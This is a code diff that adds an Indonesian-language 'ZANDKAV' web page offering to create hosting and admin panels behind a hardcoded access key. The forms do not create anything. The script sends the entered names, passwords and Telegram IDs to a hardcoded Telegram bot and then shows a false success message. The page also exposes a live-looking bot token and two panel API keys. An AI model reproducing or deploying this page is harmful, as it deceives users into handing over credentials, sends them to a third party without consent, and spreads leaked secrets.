@@ -1,19 +1,125 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Access Portal</title>
-    <link rel="stylesheet" href="css/style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ZANDKAV Panel Access</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #00f0ff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #access, #menu, #panelForm, #adminForm {
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      background: #0a0a0a;
+      padding: 20px;
+      border: 1px solid #00f0ff;
+      border-radius: 10px;
+    }
+    input, select, button {
+      padding: 10px;
+      background: #000;
+      border: 1px solid #00f0ff;
+      color: #00f0ff;
+    }
+    button:hover {
+      cursor: pointer;
+      background: #00f0ff;
+      color: #000;
+    }
+  </style>
 </head>
 <body>
-    <div class="access-container">
-        <h1>Enter Access Key</h1>
-        <form id="accessForm">
-            <input type="password" id="accessKey" placeholder="Enter access key" required>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
-    <script src="js/script.js"></script>
-</body>
+  <div id="access">
+    <h2>Masukkan Akses Kunci</h2>
+    <input type="text" id="keyInput" placeholder="Akses Kunci">
+    <button onclick="verifyKey()">Masuk</button>
+  </div>  <div id="menu">
+    <h2>Selamat Datang di ZANDKAV ADP</h2>
+    <button onclick="showPanelForm()">Create Panel</button>
+    <button onclick="showAdminForm()">Create Admin Panel</button>
+  </div>  <div id="panelForm">
+    <h3>Create Panel</h3>
+    <input type="text" id="panelUser" placeholder="Username">
+    <input type="password" id="panelPass" placeholder="Password">
+    <select id="ram">
+      <option value="UNLI">UNLI</option>
+      <option value="1GB">1GB</option>
+      <option value="2GB">2GB</option>
+      <option value="5GB">5GB</option>
+      <option value="10GB">10GB</option>
+    </select>
+    <button onclick="submitPanel()">Buat Panel</button>
+  </div>  <div id="adminForm">
+    <h3>Create Admin Panel</h3>
+    <input type="text" id="adminName" placeholder="Nama">
+    <input type="password" id="adminPass" placeholder="Password">
+    <input type="text" id="adminId" placeholder="ID Telegram">
+    <button onclick="submitAdmin()">Buat Admin Panel</button>
+  </div>  <script>
+    document.getElementById("access").style.display = "flex";
+
+    function verifyKey() {
+      const key = document.getElementById("keyInput").value;
+      if (key === "ZANDKAV ADP") {
+        document.getElementById("access").style.display = "none";
+        document.getElementById("menu").style.display = "flex";
+      } else {
+        alert("Kunci Salah!");
+      }
+    }
+
+    function showPanelForm() {
+      document.getElementById("menu").style.display = "none";
+      document.getElementById("panelForm").style.display = "flex";
+    }
+
+    function showAdminForm() {
+      document.getElementById("menu").style.display = "none";
+      document.getElementById("adminForm").style.display = "flex";
+    }
+
+    function sendToTelegram(message) {
+      const token = "8081519323:AAGoTfh5TIC-TznGmfBYeFKNnpQDMNl-AxM";
+      const chatId = "7849712634"; // ID Owner
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      });
+    }
+
+    function submitPanel() {
+      const user = document.getElementById("panelUser").value;
+      const pass = document.getElementById("panelPass").value;
+      const ram = document.getElementById("ram").value;
+      const apiKey = "ptla_hun3W0WgWP7lED1LlV8LzrTdqrhcCbGuMsL7xi7s7nR";
+      const domain = "https://pinzyprivate.otax.store";
+      const payload = {
+        username: user,
+        password: pass,
+        ram: ram
+      };
+      sendToTelegram(`Panel Dibuat:\nUser: ${user}\nRAM: ${ram}`);
+      alert("Panel berhasil dibuat di domain: " + domain);
+    }
+
+    function submitAdmin() {
+      const nama = document.getElementById("adminName").value;
+      const pass = document.getElementById("adminPass").value;
+      const idtele = document.getElementById("adminId").value;
+      const apiKey = "ptlc_Wv1PCBfjTGZdYYvwfMNjJED94mbSRqHpTgSxCdanoP6";
+      const domain = "https://pinzyprivate.otax.store";
+      const message = `Admin Panel Dibuat:\nNama: ${nama}\nPassword: ${pass}\nID Tele: ${idtele}`;
+      sendToTelegram(message);
+      alert("Admin Panel berhasil dibuat di domain: " + domain);
+    }
+  </script></body>
 </html>
